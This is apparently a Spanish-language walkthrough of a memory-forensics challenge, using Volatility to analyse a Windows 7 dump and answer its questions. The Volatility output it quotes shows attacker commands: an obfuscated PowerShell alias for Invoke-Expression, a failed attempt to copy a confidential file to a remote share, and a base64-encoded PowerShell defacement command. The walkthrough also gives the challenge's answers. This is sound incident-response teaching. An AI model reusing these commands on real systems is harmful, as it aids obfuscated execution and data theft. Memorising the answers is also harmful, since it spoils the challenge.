
## 1 y 2) ¿Cuál es el sistema operativo de la máquina? y ¿Cuándo se creó el volcado de memoria?
### Vol3

```bash
vol -f recollection.bin windows.info
```

```bash
Volatility 3 Framework 2.26.2
Progress:  100.00		PDB scanning finished                        
Variable	Value

Kernel Base	0xf8000285c000
DTB	0x187000
Symbols	file:///home/kali/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80002a3f120
NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
CSDVersion	1
KdVersionBlock	0xf80002a3f0e8
Major/Minor	15.7601
MachineType	34404
KeNumberProcessors	1
SystemTime	2022-12-19 16:07:30+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	6
NtMinorVersion	1
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	1
PE Machine	34404
PE TimeDateStamp	Thu Aug  2 02:18:10 2018
```
- **NtMajorVersion**: En Windows 7 será `6`.
- **NtMinorVersion**: En Windows 7 será `1`.
- **NtBuildNumber**: Aquí está la clave para saber si es SP1 o no.
    - `7600` = Windows 7 (RTM)
    - `7601` = Windows 7 (Service Pack 1)
- **Symbol Table**: Verás un nombre largo (ej. `ntkrnlmp.pdb/GUID...`). Si Volatility logró descargar los símbolos, esto confirma que detectó el kernel correctamente.

o 

vol -f recollection.bin windows.registry.printkey --key "Software\Microsoft\Windows NT\CurrentVersion"
(en este caso no lo reconoce)

- **Respuestas:** Windows 7 y 2022-12-19 16:07:30

### Vol2 

```bash
python2 vol.py -f ../recollection.bin imageinfo
```

```bash
  Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/hacking/sherlocks/recollection/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```


## 3) Después de que el atacante obtuviera acceso al equipo, copió un comando PowerShell ofuscado al portapapeles. ¿Cuál era el comando?

### Vol2

```bash
python2 vol.py --profile Win7SP1x64 -f ../recollection.bin clipboard
```

```bash
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ ------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
         1 WinSta0       0x0L                              0x0 ------------------           
```

- **Respuesta:** `(gv '*MDR*').naMe[3,11,2]-joIN''`

## 4) El atacante copió el comando ofuscado para utilizarlo como alias de un cmdlet de PowerShell. ¿Cuál es el nombre del cmdlet?

[Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - Securonix](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)

**Respuesta:** Invoke-Expression

## 5) Se ejecutó un comando CMD para intentar extraer un archivo. ¿Cuál es la línea de comando completa?

### Vol2

```bash
python2 vol.py --profile Win7SP1x64 -f ../recollection.bin consoles
```

```powershell
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
----
CommandHistory: 0xbebe0 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xc2f80: powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"
Cmd #1 at 0xbd660: powershell
----
Screen 0xa10c0 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]                                            
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                 
                                                                                
C:\Users\user>powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"            
iex                                                                             
                                                                                
C:\Users\user>powershell                                                        
Windows PowerShell                                                              
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                  
                                                                                
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.                                                 
At line:1 char:47                                                               
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p 
ass.txt                                                                         
    + CategoryInfo          : OpenError: (:) [], IOException                    
    + FullyQualifiedErrorId : FileOpenFailure                                   
                                                                                
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1x
QdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"                                              
The term '??????????????????????????????' is not recognized as the name of a cm 
dlet, function, script file, or operable program. Check the spelling of the nam 
e, or if a path was included, verify that the path is correct and try again.    
At line:1 char:31                                                               
+ ?????????????????????????????? <<<<                                           
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:  
   String) [], CommandNotFoundException                                         
    + FullyQualifiedErrorId : CommandNotFoundException                          
                                                                                
PS C:\Users\user> powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2V
yc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"                                          
The term '??????????????????????????????' is not recognized as the name of a cm 
dlet, function, script file, or operable program. Check the spelling of the nam 
e, or if a path was included, verify that the path is correct and try again.    
At line:1 char:31                                                               
+ ?????????????????????????????? <<<<                                           
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:  
   String) [], CommandNotFoundException                                         
    + FullyQualifiedErrorId : CommandNotFoundException                          
                                                                                
PS C:\Users\user> cd .\Downloads                                                
PS C:\Users\user\Downloads> ls                                                  
                                                                                
                                                                                
    Directory: C:\Users\user\Downloads                                          
                                                                                
                                                                                
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.exe 
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.zip 
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591 
                                             f6be48407f896b75e1320628346b03.zip 
-a---        12/19/2022   3:00 PM     309248 csrsss.exe                         
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi           
                                                                                
                                                                                
PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd317
20978c02635cb1.exe                                                              
PS C:\Users\user\Downloads>                                                     
**************************************************
ConsoleProcess: conhost.exe Pid: 2312
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 4 HistoryBufferMax: 4
OriginalTitle: Windows PowerShell
Title: Windows PowerShell
AttachedProcess: powershell.exe Pid: 3688 Handle: 0x60
----
CommandHistory: 0x1be7b0 Application: powershell.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1be500 Application: net1.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xddaf0 Application: net.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1bdab0 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xd7980: gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #1 at 0xd79d0: (gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #2 at 0x1bc560: net users
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #4 at 0xd7a20: (gv '*MDR*').naMe[3,11,2]-joIN''
----
Screen 0xe18a0 X:120 Y:3000
Dump:
Windows PowerShell                                                                                                      
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                                                          
                                                                                                                        
PS C:\Users\user> gv '*MDR*').naMe[3,11,2]-joIN''                                                                       
Unexpected token ')' in expression or statement.                                                                        
At line:1 char:12                                                                                                       
+ gv '*MDR*') <<<< .naMe[3,11,2]-joIN''                                                                                 
    + CategoryInfo          : ParserError: ():String) [], ParentContainsErrorRecordException                            
    + FullyQualifiedErrorId : UnexpectedToken                                                                           
                                                                                                                        
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex                                                                                                                     
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC                                                                                             
                                                                                                                        
-------------------------------------------------------------------------------                                         
Administrator            Guest                    user                                                                  
The command completed successfully.                                                                                     
                                                                                                                        
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.     
At line:1 char:31                                                                                                       
+ ?????????????????????????????? <<<<                                                                                   
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:String) [], CommandNotFoundException      
    + FullyQualifiedErrorId : CommandNotFoundException                                                                  
                                                                                                                        
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex                                                                                                                     
PS C:\Users\user>
```


**Respuesta:** `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`

## 6) Tras ejecutar el comando anterior, ¿nos puede indicar si el archivo se ha filtrado correctamente?

```powershell
...
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.  
...
```
**Respuesta:** No

## 7) El atacante intentó crear un archivo readme. ¿Cuál era la ruta completa del archivo?

```
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable 
```

```bash
echo ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi | base64 -d
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"%       
```

**Respuesta:** `C:\Users\Public\Office\readme.txt`

## 8) ¿Cuál era el nombre de host del equipo?

```powershell
...
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex                                                                                                                     
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC       
...    
```

**Respuesta:** `USER-PC `

## 9) ¿Cuántas cuentas de usuario había en la máquina?

```powershell
...
User accounts for \\USER-PC                                                                                             
                                                                                                                        
-------------------------------------------------------------------------------                                         
Administrator            Guest                    user                                                                  
The command completed successfully.
...                         
```

**Respuesta:** 3

## 10) En la carpeta «\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge» había algunas subcarpetas en las que se encontraba un archivo llamado passwords.txt. ¿Cuál era la ubicación/ruta completa del archivo?

### Vol3 

```bash
vol -f recollection.bin windows.filescan.FileScan | grep passwords.txt
```

```
0x11fc10070100.0\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

No es la respuesta que pide la pregunta.
### Vol2 

```bash
python2 vol.py --profile Win7SP1x64 -f ../recollection.bin filescan | grep password.txt
```

```powershell
\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

**Respuesta:**`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

## 11) Se ejecutó un archivo malicioso mediante un comando. El nombre del archivo ejecutable EXE era el valor hash del propio archivo. ¿Cuál era el valor hash?

```powershell
...
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
...
```

**Respuesta:** `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`

## 12) Siguiendo con la pregunta anterior, ¿cuál es el Imphash del archivo malicioso que has encontrado arriba?

(Cargar el hash en virustotal)

**Respuesta:** `d3b592cd9481e4f053b5362e22d61595`

## 13) Siguiendo con la pregunta anterior, ¿cuál es la fecha en formato UTC en la que se creó el archivo malicioso?

**Respuesta:** `2022-06-22 11:49:04`

## 14) ¿Cuál era la dirección IP local del equipo?

### Vol3 

```bash
vol -f recollection.bin windows.netscan.NetScan
```

```powershell
0x11dc079d0	TCPv4	192.168.0.104	49315	13.33.88.81	443	ESTABLISHED	-	-	N/A
0x11e0055c0	TCPv4	0.0.0.0	445	0.0.0.0	0	LISTENING	4	System	-
0x11e0055c0	TCPv6	::	445	::	0	LISTENING	4	System	-
0x11e00b740	TCPv4	0.0.0.0	49155	0.0.0.0	0	LISTENING	472	services.exe	-
0x11e00b740	TCPv6	::	49155	::	0	LISTENING	472	services.exe	-
0x11e0101c0	TCPv4	192.168.0.104	139	0.0.0.0	0	LISTENING	4	System	-
0x11e010b30	TCPv4	0.0.0.0	49155	0.0.0.0	0	LISTENING	472	services.exe	-
0x11e01f750	UDPv4	127.0.0.1	1900	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11e063940	UDPv4	0.0.0.0	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e063940	UDPv6	::	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e0727d0	UDPv4	0.0.0.0	5355	*	0		288	svchost.exe	2022-12-19 15:32:47.000000 UTC
0x11e09a900	UDPv4	0.0.0.0	0	*	0		288	svchost.exe	2022-12-19 15:32:44.000000 UTC
0x11e09a900	UDPv6	::	0	*	0		288	svchost.exe	2022-12-19 15:32:44.000000 UTC
0x11e09ca60	UDPv4	0.0.0.0	5355	*	0		288	svchost.exe	2022-12-19 15:32:47.000000 UTC
0x11e09ca60	UDPv6	::	5355	*	0		288	svchost.exe	2022-12-19 15:32:47.000000 UTC
0x11e15aec0	UDPv4	0.0.0.0	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e204ac0	TCPv4	0.0.0.0	49154	0.0.0.0	0	LISTENING	856	svchost.exe	-
0x11e204ac0	TCPv6	::	49154	::	0	LISTENING	856	svchost.exe	-
0x11e362880	UDPv4	0.0.0.0	55071	*	0		1248	svchost.exe	2022-12-19 15:32:38.000000 UTC
0x11e36b860	TCPv4	0.0.0.0	5357	0.0.0.0	0	LISTENING	4	System	-
0x11e36b860	TCPv6	::	5357	::	0	LISTENING	4	System	-
0x11e36fec0	UDPv4	0.0.0.0	55072	*	0		1248	svchost.exe	2022-12-19 15:32:38.000000 UTC
0x11e36fec0	UDPv6	::	55072	*	0		1248	svchost.exe	2022-12-19 15:32:38.000000 UTC
0x11e37a440	UDPv4	0.0.0.0	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e37a440	UDPv6	::	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e3b2bf0	UDPv4	192.168.0.104	138	*	0		4	System	2022-12-19 15:32:47.000000 UTC
0x11e3b40e0	UDPv4	192.168.0.104	137	*	0		4	System	2022-12-19 15:32:47.000000 UTC
0x11e43aec0	UDPv4	0.0.0.0	3702	*	0		1248	svchost.exe	2022-12-19 15:33:02.000000 UTC
0x11e443760	TCPv4	0.0.0.0	135	0.0.0.0	0	LISTENING	672	svchost.exe	-
0x11e444110	TCPv4	0.0.0.0	135	0.0.0.0	0	LISTENING	672	svchost.exe	-
0x11e444110	TCPv6	::	135	::	0	LISTENING	672	svchost.exe	-
0x11e455340	TCPv4	0.0.0.0	49152	0.0.0.0	0	LISTENING	376	wininit.exe	-
0x11e455340	TCPv6	::	49152	::	0	LISTENING	376	wininit.exe	-
0x11e455750	TCPv4	0.0.0.0	49152	0.0.0.0	0	LISTENING	376	wininit.exe	-
0x11e4a44d0	TCPv4	0.0.0.0	49153	0.0.0.0	0	LISTENING	764	svchost.exe	-
0x11e4aa790	TCPv4	0.0.0.0	49153	0.0.0.0	0	LISTENING	764	svchost.exe	-
0x11e4aa790	TCPv6	::	49153	::	0	LISTENING	764	svchost.exe	-
0x11e521ec0	UDPv4	0.0.0.0	65516	*	0		2588	msedge.exe	2022-12-19 16:04:53.000000 UTC
0x11e5ec930	TCPv4	0.0.0.0	49154	0.0.0.0	0	LISTENING	856	svchost.exe	-
0x11e9462c0	UDPv6	::1	1900	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11e957cc0	UDPv4	192.168.0.104	1900	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11e9632c0	UDPv4	0.0.0.0	5005	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11e986150	TCPv4	0.0.0.0	554	0.0.0.0	0	LISTENING	2652	wmpnetwk.exe	-
0x11e986150	TCPv6	::	554	::	0	LISTENING	2652	wmpnetwk.exe	-
0x11ee935a0	TCPv4	0.0.0.0	49156	0.0.0.0	0	LISTENING	480	lsass.exe	-
0x11f07d3c0	TCPv4	0.0.0.0	49156	0.0.0.0	0	LISTENING	480	lsass.exe	-
0x11f07d3c0	TCPv6	::	49156	::	0	LISTENING	480	lsass.exe	-
0x11f160ee0	TCPv4	0.0.0.0	10243	0.0.0.0	0	LISTENING	4	System	-
0x11f160ee0	TCPv6	::	10243	::	0	LISTENING	4	System	-
0x11f8395c0	TCPv4	192.168.0.104	49323	199.232.46.132	443	ESTABLISHED	-	-	N/A
0x11f881010	UDPv4	0.0.0.0	50039	*	0		2588	msedge.exe	2022-12-19 16:03:53.000000 UTC
0x11fa38010	UDPv4	192.168.0.104	52222	*	0		2380	msedge.exe	2022-12-19 16:04:36.000000 UTC
0x11fa42c50	UDPv4	0.0.0.0	5353	*	0		2380	msedge.exe	2022-12-19 15:35:09.000000 UTC
0x11fb498b0	UDPv4	0.0.0.0	64307	*	0		2588	msedge.exe	2022-12-19 16:06:53.000000 UTC
0x11fbd4570	TCPv4	192.168.0.104	49340	23.47.190.91	443	ESTABLISHED	-	-	N/A
0x11fbe1010	TCPv4	192.168.0.104	49326	198.144.120.23	80	CLOSED	-	-	-
0x11fc954d0	UDPv4	127.0.0.1	49678	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11fca04d0	UDPv4	0.0.0.0	5004	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11fcf0470	UDPv4	0.0.0.0	5004	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11fcf0470	UDPv6	::	5004	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11fd21cd0	TCPv4	192.168.0.104	49341	198.144.120.23	443	CLOSE_WAIT	-	-	N/A
0x11fd30ec0	UDPv4	0.0.0.0	50449	*	0		2588	msedge.exe	2022-12-19 16:06:53.000000 UTC
0x11fd4b010	TCPv4	192.168.0.104	49325	198.144.120.23	80	CLOSED	-	-	-
0x11fd4d3a0	UDPv4	0.0.0.0	62043	*	0		2588	msedge.exe	2022-12-19 16:03:39.000000 UTC
0x11fd91010	UDPv4	0.0.0.0	55846	*	0		2588	msedge.exe	2022-12-19 16:05:53.000000 UTC
0x11fda78f0	UDPv4	0.0.0.0	5005	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11fda78f0	UDPv6	::	5005	*	0		2652	wmpnetwk.exe	2022-12-19 15:34:56.000000 UTC
0x11fdb3640	UDPv4	0.0.0.0	5353	*	0		2380	msedge.exe	2022-12-19 15:35:09.000000 UTC
0x11fdb3640	UDPv6	::	5353	*	0		2380	msedge.exe	2022-12-19 15:35:09.000000 UTC
0x11fe21c40	UDPv4	0.0.0.0	55767	*	0		2588	msedge.exe	2022-12-19 16:04:53.000000 UTC
0x11fecab80	UDPv6	fe80::90a1:9bac:7a86:d6cd	1900	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11ff3b3d0	TCPv4	0.0.0.0	2869	0.0.0.0	0	LISTENING	4	System	-
0x11ff3b3d0	TCPv6	::	2869	::	0	LISTENING	4	System	-
0x11ff4ea90	UDPv6	::1	49677	*	0		1248	svchost.exe	2022-12-19 15:34:44.000000 UTC
0x11ff9c4d0	TCPv4	0.0.0.0	554	0.0.0.0	0	LISTENING	2652	wmpnetwk.exe	-
```

### Vol2 

```bash
python2 vol.py -f recollection.bin --profile=Win7SP1x64 netscan
```

**Respuesta:** `192.168.0.104`

## 15) Había varios procesos de PowerShell, uno de los cuales era un proceso secundario. ¿Cuál era su proceso principal?

### Vol3 

```bash
vol -f recollection.bin windows.pstree.PsTree
```

### Vol2

```bash
python2 /opt/volatility/vol.py -f recollection.bin --profile=Win7SP1x64 pstree
```

```powershell
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8005967060:explorer.exe                     2032   1988     23    906 2022-12-19 15:33:13 UTC+0000
. 0xfffffa8003de2750:notepad.exe                     3476   2032      1     62 2022-12-19 15:50:42 UTC+0000
. 0xfffffa80059e9b00:msedge.exe                      2380   2032     43   1123 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800383cb00:msedge.exe                     2752   2380     16    300 2022-12-19 15:34:32 UTC+0000
.. 0xfffffa8003ce4700:msedge.exe                     2060   2380     15    255 2022-12-19 15:53:59 UTC+0000
.. 0xfffffa80055e3160:msedge.exe                     2396   2380      8     87 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800586e2d0:msedge.exe                     2588   2380     16    235 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003bc1b00:msedge.exe                     2160   2380     12    161 2022-12-19 16:03:52 UTC+0000
.. 0xfffffa8003d7c060:msedge.exe                     3560   2380     15    330 2022-12-19 16:03:48 UTC+0000
.. 0xfffffa8005addb00:msedge.exe                     3032   2380     12    191 2022-12-19 15:34:35 UTC+0000
.. 0xfffffa800586eb00:msedge.exe                     2680   2380      8    142 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003b16b00:msedge.exe                      980   2380     12    195 2022-12-19 15:35:05 UTC+0000
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
. 0xfffffa8003d6b060:powershell.exe                  3688   2032      5    367 2022-12-19 15:43:39 UTC+0000
 0xfffffa80036ef040:System                              4      0     81    519 2022-12-19 15:32:28 UTC+0000
. 0xfffffa80048f1920:smss.exe                         260      4      2     29 2022-12-19 15:32:28 UTC+0000
 0xfffffa8004fa7b00:csrss.exe                         328    320      9    330 2022-12-19 15:32:30 UTC+0000
 0xfffffa80036f9060:wininit.exe                       376    320      3     76 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8004ef18e0:services.exe                     472    376      8    189 2022-12-19 15:32:30 UTC+0000
.. 0xfffffa800524c060:svchost.exe                     672    472      7    244 2022-12-19 15:32:32 UTC+0000
.. 0xfffffa8003a60060:wmpnetwk.exe                   2652    472     13    409 2022-12-19 15:34:54 UTC+0000
.. 0xfffffa80052a8060:svchost.exe                     804    472     18    438 2022-12-19 15:32:32 UTC+0000
... 0xfffffa8005959230:dwm.exe                       2012    804      3     73 2022-12-19 15:33:13 UTC+0000
.. 0xfffffa80058d4b00:taskhost.exe                   1960    472      9    203 2022-12-19 15:33:13 UTC+0000
.. 0xfffffa80052b3b00:svchost.exe                     832    472     17    382 2022-12-19 15:32:32 UTC+0000
.. 0xfffffa8005477b00:svchost.exe                    1248    472     16    268 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa8005423b00:svchost.exe                    1220    472     10    189 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa80059152d0:SearchIndexer.                 1784    472     14    623 2022-12-19 15:33:19 UTC+0000
.. 0xfffffa80052dcb00:svchost.exe                     288    472     14    464 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa80053a9b00:svchost.exe                    1144    472     17    314 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa8005207790:svchost.exe                     596    472     10    348 2022-12-19 15:32:31 UTC+0000
.. 0xfffffa80052beb00:svchost.exe                     856    472     28    945 2022-12-19 15:32:32 UTC+0000
... 0xfffffa8003ba9060:wuauclt.exe                   3336    856      3     94 2022-12-19 15:35:59 UTC+0000
... 0xfffffa8003f08b00:taskeng.exe                   3268    856      4     77 2022-12-19 16:03:12 UTC+0000
.. 0xfffffa8003a32b00:sppsvc.exe                     1572    472      4    147 2022-12-19 15:34:52 UTC+0000
.. 0xfffffa8005373b00:spoolsv.exe                    1116    472     13    268 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa800527ab00:svchost.exe                     764    472     18    468 2022-12-19 15:32:32 UTC+0000
. 0xfffffa8004fce500:lsass.exe                        480    376      6    547 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8004efab00:lsm.exe                          488    376      9    141 2022-12-19 15:32:30 UTC+0000
 0xfffffa8004fb3b00:csrss.exe                         388    368      8    377 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8003d67060:conhost.exe                     2312    388      2     54 2022-12-19 15:43:39 UTC+0000
. 0xfffffa8003a8db00:conhost.exe                     3524    388      2     55 2022-12-19 15:40:08 UTC+0000
```

**Respuesta:** `cmd.exe`

## 16) El atacante podría haber utilizado una dirección de correo electrónico para iniciar sesión en una red social. ¿Puede indicarnos la dirección de correo electrónico?

Recordando que antes había una parte que decía `hacked by mafia`:
```bash
strings recollection.bin | grep mafia
```

**Respuesta:** `mafia_code1337@gmail.com`

## 17) Utilizando el navegador MS Edge, la víctima buscó información sobre una solución SIEM. ¿Cómo se llama la solución SIEM?

### Vol3 

```
vol -f recollection.bin windows.filescan.FileScan | grep History
```

```powershell

```
### Vol2
```bash
python2 /opt/volatility/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep History
```

```powershell
0x000000011de6e9c0     16      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
0x000000011e4d59e0     16      0 R--rwd \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Windows\History\desktop.ini
0x000000011fc57a10     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
```
